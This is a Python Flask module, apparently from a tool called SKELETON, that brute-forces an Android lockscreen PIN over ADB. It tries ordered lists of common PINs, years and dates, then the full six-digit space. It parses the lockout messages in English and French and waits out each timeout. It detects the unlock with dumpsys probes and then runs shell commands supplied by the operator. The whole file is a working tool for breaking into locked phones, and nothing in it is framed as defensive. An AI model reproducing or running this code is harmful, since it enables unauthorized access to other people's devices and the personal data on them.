"""
SKELETON :: pin_siege.py — lockscreen PIN dictionary siege engine.

The honest brute force: drive `input text <code>` + KEYCODE_ENTER against
the lockscreen, parse the device's own toast for the lockout ladder,
wait exactly as long as it demands, resume. Biased dictionaries first
because humans are predictably unoriginal.

REALITY MATH (documented, not hidden):
  - ~0.9s/attempt base pace; stock ladder: 5 fails -> 30s, -> 5min, 15min...
  - 6-digit random space = 1M codes = days. NOT the promise.
  - The promise: biased spaces (years/dates/patterns/keystroke walks)
    resolve most human-chosen PINs within hours, sometimes minutes.
  - Multilingual toast parsing: EN/FR (+ numeric fallback), OEM variants.
  - Unlock detection: multi-pattern keyguard state probes; first success
    ends the siege and fires proof commands.

Runs in a background thread; panel polls /status; /stop aborts clean.
"""

import re
import time
import threading
import logging

from flask import Blueprint, jsonify, request

from adb_engine import ADBEngine

log = logging.getLogger("skeleton.siege")

siege_bp = Blueprint("siege", __name__, url_prefix="/api/siege")
engine = ADBEngine()

# --------------------------------------------------------------------------
# Dictionaries — biased-first, because nobody rolls dice for their PIN
# --------------------------------------------------------------------------
def _biased_pins():
    pins = []
    # keystroke-walk patterns & repeats — the global top of the heap
    pins += ["1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444",
             "2222", "6969", "9999", "3333", "5555", "6666", "1122", "1313",
             "8888", "4321", "2001", "1010", "2580", "0852", "1379",
             "123456", "654321", "123123", "000000", "111111", "121212",
             "112233", "789456", "159753", "123654", "456789", "987654"]
    # years 1950-2027, both 2-digit and 4-digit forms
    for y in range(1950, 2028):
        pins.append(str(y))
        if y >= 2000:
            pins.append(str(y)[2:] + str(y)[:2])   # 0102-style flips rare but free
    # calendar dates ddmm/mmdd across both centuries' habits
    for d in range(1, 32):
        for m in range(1, 13):
            pins.append(f"{d:02d}{m:02d}")
            pins.append(f"{m:02d}{d:02d}")
    # ascending/descending walks & mirrored pads
    pins += ["0123", "3210", "1478", "9632", "5656", "6767", "8989", "5252"]
    seen, out = set(), []
    for p in pins:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


def _sequential_pins(length=6, cap=None):
    """Full-space iterator for the patient operator."""
    start, total = 0, 10 ** length
    i = 0
    while i < total:
        if cap is not None and i >= cap:
            return
        yield str(i).zfill(length)
        i += 1


# --------------------------------------------------------------------------
# Lockout ladder parsing — the device tells us how long to wait
# --------------------------------------------------------------------------
_LOCKOUT_PATTERNS = [
    # EN: "Try again in 30 seconds" / "in 5 minutes"
    re.compile(r"(?:try|retry|attempt)[^0-9]{0,24}(\d+)\s*(second|minute)", re.I),
    # FR: "Réessayez dans 30 secondes" / "dans 5 minutes"
    re.compile(r"(?:r[ée]essayez|attendre?)[^0-9]{0,24}(\d+)\s*(seconde|minute)", re.I),
]
_WRONG_PATTERNS = [
    re.compile(r"(wrong|incorrect|falsch|incorrect|erron)", re.I),
]


def _parse_lockscreen_toast(xml_text):
    """Return ('wrong', wait_seconds) | ('wrong', None) | ('neutral', None)."""
    low = xml_text or ""
    for rx in _LOCKOUT_PATTERNS:
        m = rx.search(low)
        if m:
            n = int(m.group(1))
            unit = m.group(2).lower()
            secs = n * 60 if unit.startswith("min") else n
            return ("locked", max(secs, 5))
    for rx in _WRONG_PATTERNS:
        if rx.search(low):
            return ("wrong", None)
    return ("neutral", None)


def _keyguard_showing(serial):
    """Multi-probe keyguard state; True = still locked."""
    probes = (
        "dumpsys trust",
        "dumpsys window policy",
        "dumpsys window",
    )
    for probe in probes:
        res = engine.shell(probe, timeout=12, serial=serial)
        out = (res.get("stdout") or "").lower()
        if not out:
            continue
        for key_true in ("keyguardshowing=true", "iskeyguardshowing=true",
                         "mshowing=true", "keyguard showing: true"):
            if key_true in out.replace(" ", ""):
                return True
        for key_false in ("keyguardshowing=false", "iskeyguardshowing=false",
                          "mshowing=false"):
            if key_false in out.replace(" ", "").replace(":", ":"):
                return False
    return True   # assume locked when blind — safe direction


def _wake_and_ready(serial):
    """Screen on, dismissible keyguard surface presented."""
    engine.shell("input keyevent KEYCODE_WAKEUP", serial=serial, timeout=8)
    time.sleep(1.0)
    engine.shell("input keyevent 82", serial=serial, timeout=8)   # MENU swipe-up
    time.sleep(1.2)


# --------------------------------------------------------------------------
# The siege itself (background thread)
# --------------------------------------------------------------------------
class _SiegeState:
    def __init__(self):
        self.lock = threading.Lock()
        self.reset()

    def reset(self):
        self.running = False
        self.abort = False
        self.serial = None
        self.attempts = 0
        self.current_code = None
        self.lockouts_hit = 0
        self.waiting_until = 0.0
        self.started_at = None
        self.unlocked = False
        self.log_tail = []
        self.finished_at = None

    def note(self, line):
        with self.lock:
            self.log_tail.append(f"[{time.strftime('%H:%M:%S')}] {line}")
            self.log_tail[:] = self.log_tail[-40:]

    def snapshot(self):
        with self.lock:
            return {
                "running": self.running,
                "serial": self.serial,
                "attempts": self.attempts,
                "current_code": self.current_code,
                "lockouts_hit": self.lockouts_hit,
                "waiting_seconds_left": max(0, int(self.waiting_until - time.time())),
                "elapsed_s": int(time.time() - self.started_at) if self.started_at else 0,
                "unlocked": self.unlocked,
                "log": list(self.log_tail),
                "finished_at": self.finished_at,
            }


STATE = _SiegeState()


def _try_code(code, serial):
    """One attempt: type + enter, read verdict from the screen itself.

    Shell-injection gate: a lockscreen PIN is digits (4-8). Anything else
    is NOT a code — it is payload trying to ride `adb shell`. Reject it
    here, at the last door before the device, no matter what upstream
    filtering claims.
    """
    code = str(code).strip()
    if not (4 <= len(code) <= 8 and code.isdigit()):
        return "REJECTED", 0
    engine.shell(f"input text {code}", serial=serial, timeout=8)
    engine.shell("input keyevent 66", serial=serial, timeout=8)     # ENTER
    time.sleep(0.85)                                                # let UI settle
    dump = engine.shell("uiautomator dump /sdcard/siege_ui.xml && "
                        "cat /sdcard/siege_ui.xml >/dev/null && "
                        "uiautomator dump --compressed /dev/tty 2>/dev/null; "
                        "dumpsys window windows 2>/dev/null | grep -i mCurrentFocus",
                        serial=serial, timeout=20)
    # Primary signal: focused window leaves keyguard when unlocked
    focus = (dump.get("stdout") or "")
    if "keyguard" not in focus.lower() and focus.strip():
        if _keyguard_showing(serial) is False:
            return "UNLOCKED", 0
    # Secondary: toast/screen text for wrong-vs-lockout ladder
    xml_res = engine.shell("cat /sdcard/siege_ui.xml 2>/dev/null || true",
                           serial=serial, timeout=12)
    verdict, wait = _parse_lockscreen_toast(xml_res.get("stdout", ""))
    engine.shell("rm -f /sdcard/siege_ui.xml", serial=serial, timeout=8)
    if verdict == "locked":
        return "LOCKED_OUT", wait or 30
    return "WRONG", 0


def _run_siege(codes, serial, proof_cmd):
    STATE.note(f"siege opened on {serial or 'default device'}")
    _wake_and_ready(serial)
    consecutive_errors = 0
    for code in codes:
        if STATE.abort:
            STATE.note("aborted by operator")
            break
        if STATE.unlocked:
            break

        now = time.time()
        if now < STATE.waiting_until:
            remain = STATE.waiting_until - now
            STATE.note(f"respecting lockout ladder — {int(remain)}s")
            while time.time() < STATE.waiting_until and not STATE.abort:
                time.sleep(min(2, STATE.waiting_until - time.time()))
            if STATE.abort:
                break
            _wake_and_ready(serial)

        with STATE.lock:
            STATE.current_code = code
            STATE.attempts += 1
        try:
            verdict, wait = _try_code(code, serial)
            consecutive_errors = 0
        except Exception as exc:
            consecutive_errors += 1
            STATE.note(f"transport error ({consecutive_errors}): {exc}")
            if consecutive_errors >= 8:
                STATE.note("device unreachable — siege suspended")
                break
            time.sleep(3)
            continue

        if verdict == "UNLOCKED":
            with STATE.lock:
                STATE.unlocked = True
            STATE.note(f"*** CODE ACCEPTED: {code} — keyguard down ***")
            for cmd in filter(None, [c.strip() for c in proof_cmd.split(";")]):
                res = engine.shell(cmd, serial=serial, timeout=15)
                STATE.note(f"proof> {cmd} :: {(res.get('stdout') or '')[:120]}")
            break
        elif verdict == "LOCKED_OUT":
            with STATE.lock:
                STATE.lockouts_hit += 1
                STATE.waiting_until = time.time() + wait + 2   # +2 grace
            STATE.note(f"ladder step: locked {wait}s after {code}")
        else:
            if STATE.attempts % 25 == 0:
                STATE.note(f"at={STATE.attempts} last={code}")
            time.sleep(0.15)

    with STATE.lock:
        STATE.running = False
        STATE.finished_at = time.strftime("%Y-%m-%d %H:%M:%S")
    STATE.note("siege closed")


@siege_bp.route("/start", methods=["POST"])
def start():
    if STATE.running:
        return jsonify({"success": False,
                        "error": "un siège tourne déjà"}), 409
    data = request.get_json() or {}
    serial = (data.get("serial") or "").strip() or None
    preset = data.get("preset", "biased")          # biased | sequential6 | custom
    custom = data.get("codes") or []
    max_attempts = min(int(data.get("max_attempts", 3000)), 200000)
    proof_cmd = data.get("proof_cmd") or "getprop ro.product.model; id"

    if preset == "custom" and not custom:
        return jsonify({"success": False,
                        "error": "preset custom sans codes"}), 400
    # Intake gate: a PIN is 4-8 digits. Everything else is payload, not a code.
    custom = [str(c).strip() for c in custom
              if 4 <= len(str(c).strip()) <= 8 and str(c).strip().isdigit()]

    if preset == "sequential6":
        stream = _sequential_pins(cap=max_attempts)
    else:
        stream = _biased_pins()
        if custom:
            stream = list(dict.fromkeys(custom + stream))

    with STATE.lock:
        STATE.reset()
        STATE.running = True
        STATE.serial = serial
        STATE.started_at = time.time()

    threading.Thread(target=_run_siege,
                     args=(stream, serial, proof_cmd),
                     daemon=True).start()
    return jsonify({"success": True, "started": True, "preset": preset})


@siege_bp.route("/status")
def status():
    return jsonify({"success": True, **STATE.snapshot()})


@siege_bp.route("/stop", methods=["POST"])
def stop():
    STATE.abort = True
    return jsonify({"success": True, "stopping": True})
